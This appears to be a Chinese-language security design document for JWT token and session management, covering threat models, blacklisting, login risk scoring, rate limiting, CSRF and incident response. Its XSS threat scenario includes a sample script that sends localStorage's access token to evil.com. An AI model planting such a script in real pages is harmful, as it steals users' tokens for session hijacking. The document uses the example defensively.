# Token和会话管理安全性文档

## 1. 威胁模型

### 1.1 识别的威胁

| 威胁类型 | 描述 | 风险等级 |
|---------|------|---------|
| Token窃取 | 攻击者通过XSS、中间人攻击等手段窃取Token | 高 |
| Token重放 | 攻击者重复使用已截获的Token | 中 |
| 会话劫持 | 攻击者冒充合法用户访问系统 | 高 |
| 暴力破解 | 攻击者尝试大量密码组合 | 中 |
| 撞库攻击 | 使用泄露的密码数据库攻击 | 中 |
| 设备伪造 | 伪造设备信息绕过检测 | 低 |
| IP欺骗 | 伪造IP地址绕过异地检测 | 低 |

### 1.2 攻击场景

#### 场景1：XSS窃取Token
```javascript
// 恶意脚本
<script>
  fetch('http://evil.com/steal?token=' + localStorage.getItem('access_token'));
</script>
```

**防御措施**：
- ✅ 使用HttpOnly Cookie存储敏感Token
- ✅ 实施Content Security Policy
- ✅ 输入输出过滤
- ✅ Token有效期限制

#### 场景2：中间人攻击
```
用户 <--(HTTP)--> 攻击者 <--(HTTP)--> 服务器
         ↓
    窃取Token
```

**防御措施**：
- ✅ 强制使用HTTPS
- ✅ HSTS策略
- ✅ Certificate Pinning

#### 场景3：Token重放攻击
```
1. 攻击者截获有效Token
2. 在Token过期前重复使用
3. 绕过身份验证
```

**防御措施**：
- ✅ JTI唯一标识
- ✅ Token黑名单机制
- ✅ 刷新后旧Token立即失效
- ✅ 会话绑定验证

## 2. 安全机制详解

### 2.1 Token生成安全

#### 密钥管理
```python
# 生产环境必须配置
SECRET_KEY = os.environ.get('SECRET_KEY')

# 密钥强度要求
- 长度：≥32字节
- 熵值：≥256位
- 生成方式：密码学安全随机数
```

**密钥轮换策略**：
```python
# 支持多密钥验证（旧密钥仍可验证Token）
ACTIVE_SECRET_KEYS = [
    os.environ.get('SECRET_KEY_V2'),  # 当前密钥
    os.environ.get('SECRET_KEY_V1'),  # 上一版本密钥
]

def verify_token(token):
    for key in ACTIVE_SECRET_KEYS:
        try:
            payload = jwt.decode(token, key, algorithms=['HS256'])
            return payload
        except JWTError:
            continue
    raise InvalidTokenError()
```

#### JTI生成
```python
import secrets

# 使用密码学安全的随机数生成器
jti = secrets.token_hex(16)  # 32字符十六进制字符串

# 优势：
# - 密码学强度高
# - 碰撞概率极低（2^-128）
# - 无法预测
```

### 2.2 会话安全

#### 会话绑定验证
```python
def validate_session(request, token):
    """验证Token与会话匹配"""
    jti = extract_jti_from_token(token)
    session = get_session_by_jti(jti)
    
    # 1. 会话存在性检查
    if not session:
        raise InvalidSessionError()
    
    # 2. 会话活跃状态检查
    if not session.is_active:
        raise SessionRevokedError()
    
    # 3. IP地址一致性检查（可选，严格模式）
    if STRICT_IP_CHECK and session.ip_address != request.client.host:
        logger.warning(f"IP不匹配: session={session.ip_address}, request={request.client.host}")
        # 可选择拒绝或仅记录
    
    # 4. User-Agent一致性检查（可选）
    if STRICT_UA_CHECK and session.user_agent != request.headers.get('User-Agent'):
        logger.warning("User-Agent不匹配")
    
    return session
```

#### 设备指纹
```python
def generate_device_fingerprint(request):
    """生成设备指纹"""
    components = [
        request.headers.get('User-Agent', ''),
        request.headers.get('Accept-Language', ''),
        request.headers.get('Accept-Encoding', ''),
        # 客户端提供的Canvas指纹、WebGL指纹等
    ]
    
    fingerprint = hashlib.sha256('|'.join(components).encode()).hexdigest()
    return fingerprint
```

### 2.3 Token黑名单

#### Redis实现
```python
def add_to_blacklist(jti, ttl):
    """将JTI加入黑名单"""
    key = f"jwt:blacklist:{jti}"
    redis_client.setex(key, ttl, "1")

def is_blacklisted(jti):
    """检查JTI是否在黑名单中"""
    key = f"jwt:blacklist:{jti}"
    return redis_client.exists(key)
```

**优势**：
- 分布式支持：多服务器共享黑名单
- 自动过期：TTL与Token同步
- 性能优秀：O(1)时间复杂度

**降级方案**：
```python
# Redis不可用时使用内存黑名单
_memory_blacklist = set()

def is_blacklisted_fallback(jti):
    return jti in _memory_blacklist
```

### 2.4 异地登录检测

#### 风险评分算法
```python
def assess_login_risk(user_id, ip, device_id, location):
    """评估登录风险"""
    risk_score = 0
    
    # 1. 获取用户历史登录数据
    history = get_user_login_history(user_id, days=30)
    
    # 2. IP地址检查
    if ip not in history.known_ips:
        risk_score += 30
        logger.info(f"新IP登录: user={user_id}, ip={ip}")
    
    # 3. 设备检查
    if device_id not in history.known_devices:
        risk_score += 20
        logger.info(f"新设备登录: user={user_id}, device={device_id}")
    
    # 4. 地理位置检查
    if location and location not in history.known_locations:
        # 计算距离
        last_location = history.last_known_location
        distance = calculate_distance(last_location, location)
        
        if distance > 500:  # 超过500公里
            risk_score += 25
            logger.warning(f"异地登录: user={user_id}, distance={distance}km")
    
    # 5. 登录频率检查
    recent_logins = count_recent_logins(user_id, hours=1)
    if recent_logins > 5:
        risk_score += 25
        logger.warning(f"频繁登录: user={user_id}, count={recent_logins}")
    
    # 6. 时间模式检查（高级）
    if is_unusual_time(user_id, datetime.now()):
        risk_score += 10
    
    return min(risk_score, 100)
```

#### 响应策略
```python
if risk_score >= 50:
    # 高风险：需要额外验证
    send_verification_code(user.email)
    require_2fa_verification()
    
elif risk_score >= 30:
    # 中风险：通知用户
    send_login_notification(user.email, {
        'location': location,
        'device': device_name,
        'time': datetime.now(),
    })
    
else:
    # 低风险：正常登录
    pass
```

## 3. 防御措施

### 3.1 暴力破解防护

#### 登录限流
```python
# 使用slowapi进行速率限制
@limiter.limit("5/minute")
def login(request, form_data):
    """每分钟最多5次登录尝试"""
    pass
```

#### 账号锁定
```python
def check_login_attempts(username):
    """检查登录尝试次数"""
    key = f"login:attempts:{username}"
    attempts = redis_client.incr(key)
    redis_client.expire(key, 900)  # 15分钟窗口
    
    if attempts >= 5:
        # 锁定账号15分钟
        lockout_key = f"login:lockout:{username}"
        redis_client.setex(lockout_key, 900, "1")
        raise AccountLockedError("账号已被锁定，请15分钟后重试")
    
    return attempts
```

#### 验证码
```python
def require_captcha(username):
    """检查是否需要验证码"""
    attempts = get_login_attempts(username)
    return attempts >= 3  # 3次失败后要求验证码
```

### 3.2 密码安全

#### 密码强度验证
```python
def validate_password_strength(password):
    """验证密码强度"""
    if len(password) < 8:
        raise ValueError("密码长度至少8位")
    
    if not re.search(r"[A-Z]", password):
        raise ValueError("密码必须包含至少一个大写字母")
    
    if not re.search(r"[a-z]", password):
        raise ValueError("密码必须包含至少一个小写字母")
    
    if not re.search(r"\d", password):
        raise ValueError("密码必须包含至少一个数字")
    
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        raise ValueError("密码必须包含至少一个特殊字符")
    
    # 检查常见密码
    if password in COMMON_PASSWORDS:
        raise ValueError("密码过于简单，请使用更复杂的密码")
```

#### 密码哈希
```python
from passlib.context import CryptContext

# 使用bcrypt（推荐）
pwd_context = CryptContext(
    schemes=["bcrypt"],
    deprecated="auto",
    bcrypt__rounds=12,  # 工作因子：2^12次迭代
)

def hash_password(password):
    return pwd_context.hash(password)

def verify_password(plain, hashed):
    return pwd_context.verify(plain, hashed)
```

### 3.3 传输安全

#### HTTPS强制
```python
# 中间件：重定向HTTP到HTTPS
class HTTPSRedirectMiddleware:
    async def __call__(self, request, call_next):
        if request.url.scheme != 'https' and not settings.DEBUG:
            url = request.url.replace(scheme='https')
            return RedirectResponse(url)
        return await call_next(request)
```

#### HSTS头
```python
def setup_security_headers(app):
    """设置安全HTTP头"""
    @app.middleware("http")
    async def add_security_headers(request, call_next):
        response = await call_next(request)
        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        return response
```

### 3.4 CSRF防护

```python
class CSRFMiddleware:
    """CSRF防护中间件"""
    
    SAFE_METHODS = {'GET', 'HEAD', 'OPTIONS'}
    
    async def __call__(self, request, call_next):
        if request.method not in self.SAFE_METHODS:
            # 验证CSRF Token
            csrf_token = request.headers.get('X-CSRF-Token')
            session_token = request.session.get('csrf_token')
            
            if not csrf_token or csrf_token != session_token:
                raise HTTPException(status_code=403, detail="CSRF验证失败")
        
        return await call_next(request)
```

## 4. 审计与监控

### 4.1 安全日志

```python
class SecurityAuditLog:
    """安全审计日志"""
    
    @staticmethod
    def log_login(user_id, ip, status, risk_score=0):
        """记录登录事件"""
        logger.info(
            f"LOGIN: user_id={user_id}, ip={ip}, status={status}, "
            f"risk={risk_score}, timestamp={datetime.now()}"
        )
    
    @staticmethod
    def log_token_refresh(user_id, session_id, old_jti, new_jti):
        """记录Token刷新"""
        logger.info(
            f"TOKEN_REFRESH: user_id={user_id}, session={session_id}, "
            f"old_jti={old_jti[:8]}..., new_jti={new_jti[:8]}..."
        )
    
    @staticmethod
    def log_session_revoke(user_id, session_id, reason):
        """记录会话撤销"""
        logger.warning(
            f"SESSION_REVOKE: user_id={user_id}, session={session_id}, "
            f"reason={reason}"
        )
    
    @staticmethod
    def log_suspicious_activity(user_id, activity_type, details):
        """记录可疑活动"""
        logger.error(
            f"SUSPICIOUS: user_id={user_id}, type={activity_type}, "
            f"details={details}"
        )
```

### 4.2 告警规则

```python
# 告警条件
ALERT_RULES = {
    'multiple_failed_logins': {
        'threshold': 10,
        'window': '5m',
        'severity': 'high',
    },
    'unusual_location': {
        'distance_km': 1000,
        'time_window': '1h',
        'severity': 'medium',
    },
    'token_reuse_attempt': {
        'threshold': 1,
        'severity': 'critical',
    },
}

def check_alerts(event):
    """检查告警规则"""
    for rule_name, rule in ALERT_RULES.items():
        if rule_triggered(event, rule):
            send_alert(rule_name, event, rule['severity'])
```

### 4.3 监控指标

```python
# Prometheus metrics
from prometheus_client import Counter, Histogram, Gauge

# 登录指标
login_total = Counter('login_total', 'Total login attempts', ['status'])
login_duration = Histogram('login_duration_seconds', 'Login duration')
active_sessions = Gauge('active_sessions_total', 'Active sessions count')

# Token指标
token_refresh_total = Counter('token_refresh_total', 'Token refresh count')
token_blacklist_hits = Counter('token_blacklist_hits', 'Blacklist hits')

# 安全指标
suspicious_logins = Counter('suspicious_logins_total', 'Suspicious login count')
session_revocations = Counter('session_revocations_total', 'Session revocations', ['reason'])
```

## 5. 事件响应

### 5.1 Token泄露响应

```python
def handle_token_leak(user_id):
    """处理Token泄露事件"""
    
    # 1. 立即撤销所有会话
    count = SessionService.revoke_all_sessions(user_id)
    logger.critical(f"TOKEN_LEAK: user_id={user_id}, revoked={count} sessions")
    
    # 2. 发送通知
    send_security_alert(user_id, "账号安全提醒：检测到异常活动，已强制所有设备下线")
    
    # 3. 要求修改密码
    mark_password_reset_required(user_id)
    
    # 4. 记录事件
    SecurityIncident.create({
        'user_id': user_id,
        'type': 'token_leak',
        'severity': 'critical',
        'actions_taken': f'revoked {count} sessions, required password reset',
    })
```

### 5.2 暴力破解响应

```python
def handle_brute_force(username, ip):
    """处理暴力破解攻击"""
    
    # 1. 封禁IP（24小时）
    block_ip(ip, duration=86400)
    
    # 2. 锁定账号
    lock_account(username, duration=3600)
    
    # 3. 发送通知
    send_security_alert(username, f"检测到暴力破解攻击，来源IP：{ip}")
    
    # 4. 记录事件
    logger.critical(
        f"BRUTE_FORCE: username={username}, ip={ip}, "
        f"actions=blocked_ip+locked_account"
    )
```

## 6. 合规性

### 6.1 GDPR合规

```python
# 用户数据导出
def export_user_data(user_id):
    """导出用户数据（GDPR Article 20）"""
    return {
        'user_info': get_user_info(user_id),
        'login_history': get_login_history(user_id),
        'active_sessions': get_sessions(user_id),
        'security_events': get_security_events(user_id),
    }

# 用户数据删除
def delete_user_data(user_id):
    """删除用户数据（GDPR Article 17）"""
    # 1. 撤销所有会话
    revoke_all_sessions(user_id)
    
    # 2. 删除会话记录
    delete_sessions(user_id)
    
    # 3. 删除登录历史
    delete_login_history(user_id)
    
    # 4. 匿名化审计日志
    anonymize_audit_logs(user_id)
```

### 6.2 数据保留策略

```python
RETENTION_POLICY = {
    'active_sessions': timedelta(days=7),
    'inactive_sessions': timedelta(days=90),
    'login_history': timedelta(days=365),
    'security_events': timedelta(days=730),  # 2年
    'audit_logs': timedelta(days=2555),  # 7年
}

def cleanup_old_data():
    """清理过期数据"""
    for data_type, retention in RETENTION_POLICY.items():
        cutoff_date = datetime.now() - retention
        delete_before(data_type, cutoff_date)
```

## 7. 安全检查清单

### 生产部署前检查

- [ ] SECRET_KEY已配置且足够强（≥32字节）
- [ ] HTTPS已启用且证书有效
- [ ] HSTS已配置
- [ ] Redis已配置用于Token黑名单
- [ ] 登录限流已启用
- [ ] 密码强度验证已启用
- [ ] CSRF防护已启用
- [ ] 安全HTTP头已配置
- [ ] 审计日志已启用
- [ ] 监控告警已配置
- [ ] 备份策略已实施
- [ ] 事件响应流程已建立
- [ ] 定期安全审计计划已制定

### 定期安全审查

- [ ] 每季度轮换SECRET_KEY
- [ ] 每月审查异常登录日志
- [ ] 每周检查安全告警
- [ ] 每天备份会话数据
- [ ] 持续监控Token黑名单命中率

## 8. 联系方式

如发现安全漏洞，请联系：
- 安全团队：security@example.com
- 应急响应：+86-xxx-xxxx-xxxx

请勿公开披露安全漏洞，我们承诺在收到报告后24小时内响应。
